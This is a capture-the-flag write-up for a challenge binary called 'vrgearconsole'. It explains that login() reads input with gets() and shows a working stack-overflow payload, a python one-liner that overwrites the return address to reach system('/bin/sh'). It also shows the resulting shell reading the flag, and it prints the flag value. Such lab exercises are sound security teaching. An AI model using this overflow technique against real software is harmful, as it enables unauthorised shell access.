### Solved by superkojiman

The login() uses gets() to get the username and password. In main() a check is made to see what the value of access is. If it's less than 0x30 then we get a shell that has rights to read the flag. An easy way to solve it is to just overwrite login()'s return value to the location where system("/bin/sh") is called:

```
   0x080486d5 <+161>:   push   0x8048b6a
   0x080486da <+166>:   call   0x8048400 <system@plt>
```

Now we can pwn it: 

```
superkojiman@shell-web:/problems/9d5b4e8021c2c1e646362643de097f2c$ (python -c 'print "A"*32 + "\xd5\x86\x04\x08"'; cat) | ./vrgearconsole
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): Password (max 31 characters):
ls
flag.txt  vrgearconsole  vrgearconsole.c
cat flag.txt
295aa5afa0b825072f47c9d40b49cc6f
```
